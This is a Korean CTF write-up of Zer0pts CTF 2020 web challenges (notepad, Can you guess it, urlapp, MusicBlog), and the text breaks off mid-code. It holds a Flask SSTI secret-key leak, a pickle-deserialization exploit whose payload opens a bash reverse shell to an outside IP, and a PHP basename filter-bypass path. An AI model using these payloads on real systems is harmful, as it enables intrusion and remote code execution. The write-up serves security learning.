        <content type="html"><![CDATA[<p><strong>Zer0pts CTF는 일본팀인 Zer0pts에서 주최한 대회입니다. 2020 대회는 3월 7일에 열렸지만 도커 파일이 남아 있어 문제를 풀어 보았습니다. 그리고 서버 구축은 아래와 같이 하면 됩니다.</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;gitlab.com&#x2F;zer0pts&#x2F;zer0pts-ctf-2020.git</span><br><span class="line">cd zer0pts-ctf-2020</span><br><span class="line">cd &lt;Desired Problem&gt;</span><br><span class="line">docker-compose up -d ( if the &#96;-d&#96; option given, it is excuted as the backend. )</span><br></pre></td></tr></table></figure><hr><h3 id="Web-notepad-332pts"><a href="#Web-notepad-332pts" class="headerlink" title="(Web) notepad [332pts]"></a>(Web) notepad [332pts]</h3><p><strong>notepad 문제는 Python Pickle 모듈의 loads 함수에서 발생하는 RCE 취약점과 Flask SSTI 취약점을 주제로 한 문제입니다. 일단 app.py가 주어지는데 필요한 부분만 확인을 해보겠습니다.</strong><br><br></p><p><b><em><span style="color:#631F9C">&#62;</span> SSTI Vuln</em></b></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">error</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Automatically go back when page is not found &quot;&quot;&quot;</span></span><br><span class="line">    referrer = flask.request.headers.get(<span class="string">&quot;Referer&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> referrer <span class="keyword">is</span> <span class="literal">None</span>: referrer = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid_url(referrer): referrer = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    </span><br><span class="line">    html = <span class="string">&#x27;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;3;URL=&#123;&#125;&quot;&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Page not found. Redirecting...&lt;/body&gt;&lt;/html&gt;&#x27;</span>.<span class="built_in">format</span>(referrer)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(html), <span class="number">404</span></span><br></pre></td></tr></table></figure><p><strong>404 에러 페이지를 확인해보면 <code>Referer</code> 헤더를 가져와서 <code>URL</code> 값으로 그대로 사용하는 것을 볼 수 있습니다. Referer의 대한 검증 과정이 존재하지 않아 SSTI 취약점이 발생합니다.</strong><br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%2012.59.35.png?raw=true"><br><strong>그래서 Referer 헤더로 &#123;&#123;config&#125;&#125;를 보내주니 SSTI가 발생해서 config 객체를 출력해주는 것을 볼 수 있고, 시크릿 키가 <code>b&#39;$\x9e\x15\x12\xd7\x1d\x9c\x01\x05\x91\x1332\xd9(m&#39;</code>라는 것을 알 수 있습니다. 시크릿 키를 구했기 때문에 <code>session</code>을 마음대로 조작이 가능할 거 같습니다.</strong></p><p><b><em><span style="color:#631F9C">&#62;</span> Python Pickle Deserialization Vuln</em></b></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/note/&lt;int:nid&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">notepad</span>(<span class="params">nid=<span class="number">0</span></span>):</span></span><br><span class="line">    data = load()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span> &lt;= nid &lt; <span class="built_in">len</span>(data):</span><br><span class="line">        nid = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;index.html&#x27;</span>, data=data, nid=nid)</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Load saved notes &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        savedata = flask.session.get(<span class="string">&#x27;savedata&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        data = pickle.loads(base64.b64decode(savedata))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        data = [&#123;<span class="string">&quot;date&quot;</span>: now(), <span class="string">&quot;text&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;title&quot;</span>: <span class="string">&quot;*New Note*&quot;</span>&#125;]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><p><strong>/note를 보면 load() 함수를 호출하는 것을 볼 있습니다. load() 함수는 세션 값에서 <code>savedata</code>라는 값을 가져와서 base64 디코딩을 하고, pickle.loads() 함수의 인자로 넘겨주는 것을 볼 수 있습니다. 바로 여기서 RCE 취약점이 발생합니다. 해당 취약점에 자세한 내용은 구글을 통해 확인할 수 있습니다.</strong><br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%201.12.42.png?raw=true"><br><strong>Flask 세션 관련 내용을 정확히 숙지하고 있지 않아서 구글에 검색을 해보니 <code>sessions.SecureCookieSessionInterface</code>, <code>Flask</code> 두 함수를 이용하면 시크릿 키를 이용해 세션 값을 만들어 줄 수 있는 것을 알 수 있었습니다. 물론 Flask 함수를 쓰지 않고 클래스를 생성해서도 줄 수 있습니다.</strong><br><br></p><p><strong>그러니 시크릿 키를 이용해서 세션 값을 변조하고, 변조한 세션 값을 가지고, /note/<a href="int:id">int:id</a>로 접근을 해주면 load() 함수의 pickle.loads() 함수가 호출이 돼서 RCE가 발생하게 됩니다. </p><p><b><em><span style="color:#631F9C">&#62;</span> Exploit</em></b></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>   │ <span class="keyword">import</span> os, sys, base64, pickle, requests</span><br><span class="line"> <span class="number">2</span>   │ <span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"> <span class="number">3</span>   │ <span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"> <span class="number">4</span>   │</span><br><span class="line"> <span class="number">5</span>   │ cmd = <span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/141.164.52.207/12345 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line"> <span class="number">6</span>   │ key_ = <span class="string">b&#x27;$\x9e\x15\x12\xd7\x1d\x9c\x01\x05\x91\x1332\xd9(m&#x27;</span></span><br><span class="line"> <span class="number">7</span>   │ <span class="class"><span class="keyword">class</span> <span class="title">RCE</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"> <span class="number">8</span>   │     <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line"> <span class="number">9</span>   │         <span class="keyword">return</span> (os.system,(cmd,))</span><br><span class="line"><span class="number">10</span>   │</span><br><span class="line"><span class="number">11</span>   │ <span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line"><span class="number">12</span>   │     app = Flask(<span class="string">&quot;app&quot;</span>)</span><br><span class="line"><span class="number">13</span>   │     app.secret_key = key_</span><br><span class="line"><span class="number">14</span>   │</span><br><span class="line"><span class="number">15</span>   │     sscsi = SecureCookieSessionInterface()</span><br><span class="line"><span class="number">16</span>   │     signingSerializer = sscsi.get_signing_serializer(app)</span><br><span class="line"><span class="number">17</span>   │</span><br><span class="line"><span class="number">18</span>   │     session = signingSerializer.dumps(&#123;<span class="string">&#x27;savedata&#x27;</span>:base64.b64encode(pickle.dumps(RCE()))&#125;)</span><br><span class="line"><span class="number">19</span>   │     print(<span class="string">&quot;Sessions : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(session))</span><br><span class="line"><span class="number">20</span>   │     requests.get(<span class="string">&#x27;http://localhost:8001/note/1&#x27;</span>, cookies = &#123;<span class="string">&#x27;session&#x27;</span>:session&#125;)</span><br><span class="line"><span class="number">21</span>   │</span><br><span class="line"><span class="number">22</span>   │ <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="number">23</span>   │     print(<span class="string">&quot;[+] RCE in Pickle Start&quot;</span>)</span><br><span class="line"><span class="number">24</span>   │     exploit()</span><br></pre></td></tr></table></figure><p><strong>그래서 파이썬을 이용해서 위와 같이 RCE POC를 작성해주었습니다. 처음에는 <code>nc</code>를 이용해서 쉘을 딸려 했지만 잘 되지 않았습니다. 그래서 그냥 코드 미스인 줄 알았는데 <code>bash -c</code>를 이용해서 쉘을 따주니 잘 되었습니다.</strong><br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%201.35.23.png?raw=true"><br><strong>RCE POC를 돌려주니 쉘이 잘 따지는 것을 볼 수 있고, flag도 볼 수 있었습니다. ( nc 명령어를 확인해보니 명령어 자체가 없었음 )</strong></p><p><code>FLAG : zer0pts&#123;fl4sk_s3ss10n_4nd_pyth0n_RCE&#125;</code></p><hr><h3 id="Web-Can-you-guess-it-345pts"><a href="#Web-Can-you-guess-it-345pts" class="headerlink" title="(Web) Can you guess it [345pts]"></a>(Web) Can you guess it [345pts]</h3><p><strong>Can you guess it 문제는 PHP 트릭류 문제입니다. </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;<span class="keyword">If</span> your guess is correct, I<span class="string">&#x27;ll give you the flag.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;?php if (isset($message)) &#123; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p><b><em><span style="color:#631F9C">&#62;</span> analysis</em></b></p><p><strong>FLAG는 config.php에 정의가 되어 있다고 합니다.</strong><br><br></p><p><strong>코드를 보면 $_SERVER[‘PHP_SELF’]의 값을 highlight_file() 함수의 인자로 넘겨주는 것을 볼 수 있습니다. $_SERVER[‘PHP_SELF’]는 현재 페이지의 주소에서 도메인과 넘어가는 값(파라미터)를 제외한 것들을 가져오는 슈퍼 글로벌 함수 입니다. 즉, Path만 가져온다는 것 입니다.</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>하지만 preg_match() 함수를 이용해서 $_SERVER[‘PHP_SELF’] 값을 검증하고 있기 때문에 일반적으로 접근을 하게 되면 <code>config.php</code>가 필터링에 걸리기 때문에 힘들 거 같습니다.</strong><br><br></p><p><strong>그러다 구글링을 하다가 <a href="https://ngaa.tistory.com/m/46?category=776250">여기서</a> 신기한 것을 발견했습니다. basename 함수에 \x80-\xff 범위의 값 중 하나만 들어오면 그 값은 무시한다는 것을 알 수 있었습니다.</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&quot;);</span><br><span class="line">config.php</span><br><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&#x2F;\xbb&quot;);</span><br><span class="line">config.php</span><br><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&#x2F;\xab&quot;);</span><br><span class="line">config.php</span><br><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&#x2F;\xff&quot;);</span><br><span class="line">config.php</span><br></pre></td></tr></table></figure><p><strong>테스트를 해본 결과 \x80-\xff 범위의 값을 모두 무시하는 것을 확인할 수 있었습니다. 그리고 저 범위의 값들이 prge_match에 들어가도 우회가 됩니다.</strong> </p><p><b><em><span style="color:#631F9C">&#62;</span> Exploit</em></b></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;config.php&#x2F;%aa?source</span><br></pre></td></tr></table></figure><p><strong>위 path로 접근을 해주면 preg_match(), basename() 함수를 우회해 config.php의 소스 코드를 볼 수 있습니다.</strong></p><p><code>FLAG : zer0pts&#123;gu3ss1ng_r4nd0m_by73s_1s_un1n73nd3d_s0lu710n&#125;</code></p><hr><h3 id="Web-urlapp-435pts"><a href="#Web-urlapp-435pts" class="headerlink" title="(Web) urlapp [435pts]"></a>(Web) urlapp [435pts]</h3><p><strong>urlapp 문제는 루비로 작성된 Redis 서비스에서 Redis SSRF 취약점을 주제로한 문제입니다. 하지만 왠지 모르게 익스를 계속 시도해도 set 명령어가 제대 인식이 되지 않는 거 같다. </strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(sock, key, value)</span></span></span><br><span class="line">  query(sock, <span class="string">&quot;SET <span class="subst">#&#123;key&#125;</span> <span class="subst">#&#123;value&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock) == <span class="string">&quot;OK&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(sock, key)</span></span></span><br><span class="line">  query(sock, <span class="string">&quot;GET <span class="subst">#&#123;key&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">before <span class="keyword">do</span></span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, <span class="string">&quot;flag&quot;</span>, File.read(<span class="string">&quot;flag.txt&quot;</span>).strip)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> params.has_key?(<span class="symbol">:q</span>) <span class="keyword">then</span></span><br><span class="line">    q = params[<span class="symbol">:q</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (q =~ <span class="regexp">/^[0-9a-f]&#123;16&#125;$/</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    sock = connect()</span><br><span class="line">    url = get(sock, q)</span><br><span class="line">    redirect url</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  send_file <span class="string">&#x27;index.html&#x27;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> params.has_key?(<span class="symbol">:url</span>) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  url = params[<span class="symbol">:url</span>]</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> (url =~ URI.regexp) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  key = Random.urandom(<span class="number">8</span>).unpack(<span class="string">&quot;H*&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, key, url)</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;<span class="subst">#&#123;request.host&#125;</span>:<span class="subst">#&#123;request.port&#125;</span>/?q=<span class="subst">#&#123;key&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p><strong>취약점은 set 함수를 호출해서 url 값을 value로 이용해서 하나의 데이터를 생성하고 있습니다. 하지만 url 파라미터의 개행문제에 대한 필터링이 존재하지 않아 redis eval 명령어를 이용해서 set, get 명령어를 사용할 수 있게됩니다. </strong><br><br></p><p><strong>그래서 value 값을 redis.call(‘get’,’flag’)를 이용해서 flag를 가져와서 value로 넣어주고, 해당 데이터의 키를 이용해서 접근하면 flag를 볼 수 있습니다. 하지만 익스 페이로드를 작성해서 넘겨주니 잘 되지 않았습니다…</strong><br><br></p><p><strong>다시 풀어 더 정확한 풀이를 남기겠습니다.</strong></p><hr><h3 id="Web-MusicBlog-653pts"><a href="#Web-MusicBlog-653pts" class="headerlink" title="(Web) MusicBlog [653pts]"></a>(Web) MusicBlog [653pts]</h3><p><strong>MusicBlog 문제는 딱히 취약점 분류를 하기는 힘들고, 그냥 웹 서비스 로직 결함을 이용해 공격하는 문제입니다. 일단 소스 코드가 많아 로직이 어떤 식으로 돌아가는 지부터 확인을 해보겠습니다.</strong></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%205.54.19.png?raw=true"><br><br><strong>회원 가입을 하고, 로그인을 하면 Post를 작성하는 기능과 Post를 보는 기능이 존재합니다.</strong></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%205.57.47.png?raw=true"><br><strong>Post를 작성해주니 이상한 점은 <code>좋아요</code>를 눌러주지 않았는데 <code>좋아요</code>가 하나 찍힌 것을 볼 수 있다. 아마 Post가 새로 생성이 되면 좋아요가 자동으로 찍히는 로직이 있는 거 같습니다. 더 자세한 내용을 확인하기 위해서 코드를 분석해보겠습니다.</strong></p><p><b><em><span style="color:#631F9C">&#62;</span> post.php</em></b></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;mt-4&quot;</span>&gt;</span></span><br><span class="line">            &lt;?php if ($post[&#x27;published&#x27;] === &#x27;0&#x27;) &#123; ?&gt;<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;badge badge-secondary&quot;</span>&gt;</span>Secret<span class="tag">&lt;/<span class="name">span</span>&gt;</span>&lt;?php &#125; ?&gt;</span><br><span class="line">            &lt;?= $post[&#x27;title&#x27;] ?&gt;</span><br><span class="line">          <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;text-muted&quot;</span>&gt;</span>by &lt;?= $post[&#x27;username&#x27;] ?&gt; <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;badge badge-love badge-pill&quot;</span>&gt;</span>♥ &lt;?= $post[&#x27;likes&#x27;] ?&gt;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span></span><br><span class="line">            &lt;?= render_tags($post[&#x27;content&#x27;]) ?&gt;</span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;like.php?id=&lt;?= $post[&#x27;id&#x27;] ?&gt;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;like&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-love&quot;</span>&gt;</span>♥ Like this post<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">(생략)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>post.php를 보면 content의 값을 render_tags() 함수를 이용해서 검증을 하고 출력하는 것을 볼 수 있습니다.</p><p><b><em><span style="color:#631F9C">&#62;</span> util.php</em></b></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="comment">// [[URL]] → &lt;audio src=&quot;URL&quot;&gt;&lt;/audio&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_tags</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$str</span> = preg_replace(<span class="string">&#x27;/\[\[(.+?)\]\]/&#x27;</span>, <span class="string">&#x27;&lt;audio controls src=&quot;\\1&quot;&gt;&lt;/audio&gt;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  <span class="variable">$str</span> = strip_tags(<span class="variable">$str</span>, <span class="string">&#x27;&lt;audio&gt;&#x27;</span>); <span class="comment">// only allows `&lt;audio&gt;`</span></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"><span 